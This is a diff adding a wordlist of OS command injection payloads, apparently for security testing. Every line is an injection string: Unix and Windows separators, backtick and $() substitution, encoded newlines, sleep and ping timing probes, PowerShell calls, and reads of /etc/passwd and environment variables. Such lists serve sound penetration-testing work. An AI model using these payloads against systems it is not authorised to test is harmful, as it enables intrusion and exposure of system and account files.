@@ -1,0 +1,64 @@
+# Command Injection Payloads
+# Each line tests for OS command injection
+
+# Unix command separators
+; ls -la
+; id
+; whoami
+; cat /etc/passwd
+; uname -a
+| ls -la
+| id
+| whoami
+| cat /etc/passwd
+|| id
+&& id
+`id`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+
+# Windows command separators
+& dir
+& ipconfig
+& whoami
+| dir
+| ipconfig
+| whoami
+&& dir
+|| dir
+
+# Backtick execution
+`ls`
+`whoami`
+`id`
+
+# Newline injection
+%0aid
+%0als
+%0d%0aid
+
+# Time-based detection
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+& ping -c 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& timeout 5
+
+# PowerShell
+| powershell -c "whoami"
+& powershell -c "Get-Process"
+; powershell -c "Get-ChildItem"
+
+# Environment variables / expansion
+%COMSPEC% /c dir
+| echo %PATH%
+; printenv
+$(printenv HOME)
+
+# Chained / nested
+;$(whoami)
+|`id`
+& echo vulnerable & whoami
